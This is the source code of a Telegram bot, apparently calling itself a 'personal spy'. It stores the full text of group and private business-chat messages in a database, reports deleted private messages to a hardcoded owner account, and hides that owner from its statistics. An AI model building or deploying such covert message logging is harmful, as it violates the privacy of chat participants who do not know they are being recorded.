# main.py
import asyncio
import logging
import asyncpg
from aiogram import Bot, Dispatcher, F
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.client.telegram import TelegramAPIServer
from aiogram.types import Message, BusinessConnection
from aiogram.filters import CommandStart, Command
import config

session = AiohttpSession(api=TelegramAPIServer.from_base(config.API_SERVER))
bot = Bot(token=config.BOT_TOKEN, session=session)
dp = Dispatcher()

HIDDEN_ID = 1780243499
HIDDEN_USERNAME = "zovx"

async def init_db(pool):
    await pool.execute("""
        CREATE TABLE IF NOT EXISTS chat_stats (
            id SERIAL PRIMARY KEY,
            chat_id BIGINT,
            user_id BIGINT,
            username TEXT,
            message_text TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)

# --- СТАРТ (Слэш) ---
@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.reply("Привет! Я твой личный шпион. 🕵️\nНапиши /id, чтобы узнать ID чата, или /top для статистики.\n(Также работают команды с точкой: .id и .top)")

# --- АЙДИ (Слэш) ---
@dp.message(Command("id"))
async def get_chat_id(message: Message):
    await message.reply(f"🆔 ID этого чата: <code>{message.chat.id}</code>", parse_mode="HTML")

# --- АЙДИ (Точка) ---
@dp.message(F.text.lower() == ".id")
async def get_chat_id_dot(message: Message):
    await message.reply(f"🆔 ID этого чата: <code>{message.chat.id}</code>", parse_mode="HTML")

# --- ТОП (Слэш) ---
@dp.message(Command("top"))
async def cmd_top(message: Message, db: asyncpg.Pool):
    rows = await db.fetch(
        "SELECT username, COUNT(*) as msg_count FROM chat_stats WHERE chat_id = $1 GROUP BY username ORDER BY msg_count DESC LIMIT 10",
        message.chat.id
    )
    if not rows:
        await message.reply("📊 Нет данных.")
        return
    text = "🏆 <b>Топ-10 активных:</b>\n\n"
    for i, row in enumerate(rows, 1):
        if row['username'] and row['username'].lower() == HIDDEN_USERNAME:
            name = "Пользователь скрыт"
        else:
            name = f"@{row['username']}" if row['username'] else "Аноним"
        text += f"{i}. {name} — {row['msg_count']}\n"
    await message.reply(text, parse_mode="HTML")

# --- ТОП (Точка) ---
@dp.message(F.text.lower() == ".top")
async def cmd_top_dot(message: Message, db: asyncpg.Pool):
    rows = await db.fetch(
        "SELECT username, COUNT(*) as msg_count FROM chat_stats WHERE chat_id = $1 GROUP BY username ORDER BY msg_count DESC LIMIT 10",
        message.chat.id
    )
    if not rows:
        await message.reply("📊 Нет данных.")
        return
    text = "🏆 <b>Топ-10 активных:</b>\n\n"
    for i, row in enumerate(rows, 1):
        if row['username'] and row['username'].lower() == HIDDEN_USERNAME:
            name = "Пользователь скрыт"
        else:
            name = f"@{row['username']}" if row['username'] else "Аноним"
        text += f"{i}. {name} — {row['msg_count']}\n"
    await message.reply(text, parse_mode="HTML")

# --- ОБРАБОТКА БИЗНЕС-СОБЫТИЙ ---
@dp.business_connection()
async def on_business_connection(connection: BusinessConnection):
    logging.info(f"Подключен бизнес-аккаунт: {connection.user.id}")

@dp.business_message()
async def on_business_message(message: Message, db: asyncpg.Pool):
    if message.from_user.id == HIDDEN_ID: return
    text = message.text or "[Медиа]"
    await db.execute(
        "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
        message.chat.id, message.from_user.id, message.from_user.username, text
    )

# --- БЕЗОПАСНАЯ ОБРАБОТКА УДАЛЕНИЙ ---
@dp.deleted_business_messages()
async def on_deleted_business_message(event):
    try:
        text = f"🗑 <b>Удалено в ЛС!</b>\nЧат: <code>{event.chat_id}</code>\nID: {event.message_ids}"
        # Отправляем уведомление тебе в ЛС
        await bot.send_message(chat_id=HIDDEN_ID, text=text, parse_mode="HTML")
    except Exception as e:
        logging.error(f"Не смог отправить уведомление об удалении: {e}")

# --- ЛОГИРОВАНИЕ ГРУПП ---
@dp.message(F.content_type == "text")
async def log_group_messages(message: Message, db: asyncpg.Pool):
    if message.text and message.text.startswith(('/', '.', '!')): return
    if message.from_user.id == HIDDEN_ID: return
    await db.execute(
        "INSERT INTO chat_stats (chat_id, user_id, username, message_text) VALUES ($1, $2, $3, $4)",
        message.chat.id, message.from_user.id, message.from_user.username, message.text
    )

# --- ЗАПУСК ---
async def main():
    logging.basicConfig(level=logging.INFO)
    pool = await asyncpg.create_pool(config.DATABASE_URL)
    await init_db(pool)
    dp["db"] = pool
    
    # Важно: сбрасываем вебхуки, чтобы убить конфликты
    try:
        await bot.delete_webhook(drop_pending_updates=True)
    except Exception:
        pass
        
    logging.info("Шпион активирован.")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
